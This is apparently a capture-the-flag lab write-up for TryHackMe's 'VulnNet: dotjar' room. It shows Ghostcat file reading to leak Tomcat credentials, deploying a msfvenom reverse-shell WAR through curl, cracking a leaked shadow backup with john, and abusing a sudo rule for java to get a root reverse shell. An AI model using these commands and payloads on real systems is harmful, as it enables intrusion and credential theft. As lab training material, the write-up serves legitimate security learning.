## VulnNet: dotjar

# Enumeration
```
# Nmap 7.91 scan initiated Sat May  8 17:50:12 2021 as: nmap -sCV -oN nmap/initial -vvv -p 8009,8080 10.10.3.26
Nmap scan report for 10.10.3.26
Host is up, received timestamp-reply ttl 61 (0.15s latency).
Scanned at 2021-05-08 17:50:12 PDT for 13s

PORT     STATE SERVICE REASON         VERSION
8009/tcp open  ajp13   syn-ack ttl 61 Apache Jserv (Protocol v1.3)
| ajp-methods:
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http    syn-ack ttl 61 Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache Tomcat/9.0.30

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat May  8 17:50:25 2021 -- 1 IP address (1 host up) scanned in 12.84 seconds
```

Just tomcat and ajp services are running, we go ahead and try the low-hanging fruit of default tomcat credentials to no avail so lets switch over to the ajp service. Another room on tryhackme, https://tryhackme.com/room/tomghost, has previously covered the ghostcat exploit which can be found here, https://www.exploit-db.com/exploits/48143, or using searchsploit 
```
# searchsploit ghostcat                      

-------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                        |  Path
-------------------------------------------------------------------------------------- ---------------------------------
Apache Tomcat - AJP 'Ghostcat File Read/Inclusion                                     | multiple/webapps/48143.py
Apache Tomcat - AJP 'Ghostcat' File Read/Inclusion (Metasploit)                       | multiple/webapps/49039.rb
-------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

and then use it as follows
```
# python2 48143.py 10.10.3.26                                                                                     

Getting resource at ajp13://10.10.3.26:8009/asdf
----------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>VulnNet Entertainment</display-name>
  <description>
     VulnNet Dev Regulations - mandatory

1. Every VulnNet Entertainment dev is obligated to follow the rules described herein according to the contract you signed.
2. Every web application you develop and its source code stays here and is not subject to unauthorized self-publication.
-- Your work will be reviewed by our web experts and depending on the results and the company needs a process of implementation might start.
-- Your project scope is written in the contract.
3. Developer access is granted with the credentials provided below:

    REDACTED CREDENTIALS

GUI access is disabled for security reasons.

4. All further instructions are delivered to your business mail address.
5. If you have any additional questions contact our staff help branch.
  </description>

</web-app>
```

So we find developer credentials using this but we also are informed that GUI access is disabled so we'll have to do this using curl. Tomcat works with .war files so we'll start by creating a payload with msfvenom

```
# msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f war -o shell.war
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 68 bytes
Final size of war file: 1536 bytes
Saved as: shell.war
```

We can upload this using curl as follows,
```
# curl -u 'webdev' --upload-file shell.war http://10.10.3.26:8080/manager/text/deploy?path=/                          
Enter host password for user 'webdev':
OK - Deployed application at context path [/shell.war]
```

We can check the shell.war file to find the .jsp filename generated for you payload and execute it at the following format url, http://10.10.3.26:8080/shell.war/ildcatgr.jsp
```
# nc -nlvp 4242
listening on [any] 4242 ...
connect to [IP] from (UNKNOWN) [10.10.3.26] 56320
whoami
web
python3 -c 'import pty;pty.spawn("/bin/bash")'
web@vulnnet-dotjar:/$ export TERM=xterm
export TERM=xterm
web@vulnnet-dotjar:/$ ^Z
zsh: suspended  nc -nlvp 4242

# stty raw -echo; fg
[1]  + continued  nc -nlvp 4242

web@vulnnet-dotjar:/$
```

# Initial Foothold

Out initial checks for sudo privileges, SUID binaries, and cronjobs doesn't provide us any avenue of ecalation so we go ahead and upload linpeas to end up finding a file /var/backups/shadow-backup-alt.gz
```
web@vulnnet-dotjar:/var/backups$ gunzip shadow-backup-alt.gz
gzip: shadow-backup-alt: Permission denied
web@vulnnet-dotjar:/var/backups$ cp shadow-backup-alt.gz /tmp/shd.gz
web@vulnnet-dotjar:/var/backups$ cd /tmp
web@vulnnet-dotjar:/tmp$ gunzip shd.gz
web@vulnnet-dotjar:/tmp$ ls -la
total 48
drwxrwxrwt 10 root root 4096 May  9 03:38 .
drwxr-xr-x 23 root root 4096 Jan 15 15:37 ..
drwxrwxrwt  2 root root 4096 May  9 02:48 .ICE-unix
drwxrwxrwt  2 root root 4096 May  9 02:48 .Test-unix
-r--r--r--  1 root root   11 May  9 02:48 .X0-lock
drwxrwxrwt  2 root root 4096 May  9 02:48 .X11-unix
drwxrwxrwt  2 root root 4096 May  9 02:48 .XIM-unix
drwxrwxrwt  2 root root 4096 May  9 02:48 .font-unix
drwxr-x---  2 web  web  4096 May  9 02:48 hsperfdata_web
-rw-r-----  1 web  web  1179 May  9 03:37 shd
drwx------  3 root root 4096 May  9 02:48 systemd-private-b29f7eef9d9d491cb9789741ee5f5099-systemd-resolved.service-8VUftV
drwx------  3 root root 4096 May  9 02:48 systemd-private-b29f7eef9d9d491cb9789741ee5f5099-systemd-timesyncd.service-FDceRB
web@vulnnet-dotjar:/tmp$ cat shd
root:$6REDACTED:18643:0:99999:7:::
daemon:*:18642:0:99999:7:::
bin:*:18642:0:99999:7:::
sys:*:18642:0:99999:7:::
sync:*:18642:0:99999:7:::
games:*:18642:0:99999:7:::
man:*:18642:0:99999:7:::
lp:*:18642:0:99999:7:::
mail:*:18642:0:99999:7:::
news:*:18642:0:99999:7:::
uucp:*:18642:0:99999:7:::
proxy:*:18642:0:99999:7:::
www-data:*:18642:0:99999:7:::
backup:*:18642:0:99999:7:::
list:*:18642:0:99999:7:::
irc:*:18642:0:99999:7:::
gnats:*:18642:0:99999:7:::
nobody:*:18642:0:99999:7:::
systemd-network:*:18642:0:99999:7:::
systemd-resolve:*:18642:0:99999:7:::
syslog:*:18642:0:99999:7:::
messagebus:*:18642:0:99999:7:::
_apt:*:18642:0:99999:7:::
uuidd:*:18642:0:99999:7:::
lightdm:*:18642:0:99999:7:::
whoopsie:*:18642:0:99999:7:::
kernoops:*:18642:0:99999:7:::
pulse:*:18642:0:99999:7:::
avahi:*:18642:0:99999:7:::
hplip:*:18642:0:99999:7:::
jdk-admin:$6REDACTED:0:99999:7:::
web:$6REDACTED:18643:0:99999:7:::
web@vulnnet-dotjar:/tmp$
```

We find hashes for root and jdk-admin credentials and can use the following to try and crack them 
```
# john --format=sha512crypt hashes --wordlist=/usr/share/wordlists/rockyou.txt
```

We end up cracking the jdk-admin credentials and can go ahead and switch users and claim the user.txt flag
```
web@vulnnet-dotjar:/tmp$ su jdk-admin
Password:
jdk-admin@vulnnet-dotjar:/tmp$ cd /home/jdk-admin
jdk-admin@vulnnet-dotjar:~$ ls -la
total 104
drwxr-x--- 17 jdk-admin jdk-admin 4096 Jan 31 16:19 .
drwxr-xr-x  4 root      root      4096 Jan 15 15:52 ..
lrwxrwxrwx  1 root      root         9 Jan 16 13:35 .bash_history -> /dev/null
-rw-r--r--  1 jdk-admin jdk-admin  220 Jan 15 15:25 .bash_logout
-rw-r--r--  1 jdk-admin jdk-admin 3771 Jan 15 15:25 .bashrc
drwxrwxr-x  8 jdk-admin jdk-admin 4096 Jan 16 13:49 .cache
drwxrwxr-x 14 jdk-admin jdk-admin 4096 Jan 15 15:30 .config
drwx------  3 jdk-admin jdk-admin 4096 Jan 15 15:29 .dbus
drwx------  2 jdk-admin jdk-admin 4096 Jan 15 15:29 Desktop
-rw-r--r--  1 jdk-admin jdk-admin   26 Jan 15 15:29 .dmrc
drwxr-xr-x  2 jdk-admin jdk-admin 4096 Jan 15 15:29 Documents
drwxr-xr-x  2 jdk-admin jdk-admin 4096 Jan 15 15:29 Downloads
drwx------  3 jdk-admin jdk-admin 4096 Jan 15 15:29 .gnupg
drwxrwxr-x  3 jdk-admin jdk-admin 4096 Jan 15 15:29 .local
drwx------  5 jdk-admin jdk-admin 4096 Jan 15 15:33 .mozilla
drwxr-xr-x  2 jdk-admin jdk-admin 4096 Jan 15 15:29 Music
drwxr-xr-x  2 jdk-admin jdk-admin 4096 Jan 15 15:29 Pictures
-rw-r--r--  1 jdk-admin jdk-admin  807 Jan 15 15:25 .profile
drwxr-xr-x  2 jdk-admin jdk-admin 4096 Jan 15 15:29 Public
-rw-r--r--  1 jdk-admin jdk-admin    0 Jan 15 15:31 .sudo_as_admin_successful
drwxr-xr-x  2 jdk-admin jdk-admin 4096 Jan 15 15:29 Templates
drwx------  4 jdk-admin jdk-admin 4096 Jan 16 13:46 .thumbnails
-rw-------  1 jdk-admin jdk-admin   38 Jan 31 16:19 user.txt
drwxr-xr-x  2 jdk-admin jdk-admin 4096 Jan 15 15:29 Videos
-rw-------  1 jdk-admin jdk-admin   60 Jan 16 13:29 .Xauthority
-rw-r--r--  1 jdk-admin jdk-admin   14 Feb 12  2018 .xscreensaver
-rw-------  1 jdk-admin jdk-admin 2522 Jan 16 13:29 .xsession-errors
-rw-------  1 jdk-admin jdk-admin 2522 Jan 15 17:49 .xsession-errors.old
```

# Root Escalation
```
jdk-admin@vulnnet-dotjar:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

Password:
Matching Defaults entries for jdk-admin on vulnnet-dotjar:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jdk-admin may run the following commands on vulnnet-dotjar:
    (root) /usr/bin/java -jar *.jar
```

Looks like we have sudo permission to run any .jar file as root so we can create a payload using msfvenom again and upload it to the machine to get a root shell
```
# msfvenom -p java/shell_reverse_tcp LHOST=1IP LPORT=PORT -f jar -o shell.jar
Payload size: 7507 bytes
Final size of jar file: 7507 bytes
Saved as: shell.jar
```

We can just upload this the machine and execute it as follows
```
jdk-admin@vulnnet-dotjar:/tmp$ sudo /usr/bin/java -jar shell.jar
```

and receive the following on our listener, to go and claim the root.txt flag
```
# nc -nlvp 4243
listening on [any] 4243 ...
connect to [IP] from (UNKNOWN) [10.10.3.26] 50558
whoami
root
cd /root
ls -la
total 100
drwx------ 17 root root 4096 Jan 31 16:21 .
drwxr-xr-x 23 root root 4096 Jan 15 15:37 ..
lrwxrwxrwx  1 root root    9 Jan 16 13:35 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  6 root root 4096 Jan 31 16:14 .cache
drwxr-xr-x 11 root root 4096 Jan 31 16:01 .config
drwx------  3 root root 4096 Jan 31 16:00 .dbus
drwx------  2 root root 4096 Jan 31 16:00 Desktop
-rw-r--r--  1 root root   41 Jan 31 16:00 .dmrc
drwxr-xr-x  2 root root 4096 Jan 31 16:00 Documents
drwxr-xr-x  3 root root 4096 Jan 31 16:07 Downloads
drwx------  3 root root 4096 Jan 31 16:00 .gnupg
drwxr-xr-x  3 root root 4096 Jan 15 17:54 .local
drwx------  5 root root 4096 Jan 31 16:02 .mozilla
drwxr-xr-x  2 root root 4096 Jan 31 16:00 Music
drwxr-xr-x  2 root root 4096 Jan 31 16:00 Pictures
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwxr-xr-x  2 root root 4096 Jan 31 16:00 Public
-rw-------  1 root root   38 Jan 31 16:21 root.txt
drwxr-xr-x  2 root root 4096 Jan 31 16:00 Templates
drwx------  4 root root 4096 Jan 31 16:12 .thumbnails
drwxr-xr-x  2 root root 4096 Jan 31 16:00 Videos
-rw-------  1 root root  119 Jan 31 16:16 .Xauthority
-rw-r--r--  1 root root   14 Feb 12  2018 .xscreensaver
-rw-------  1 root root 2504 Jan 31 16:16 .xsession-errors
-rw-------  1 root root 2386 Jan 31 16:00 .xsession-errors.old
```
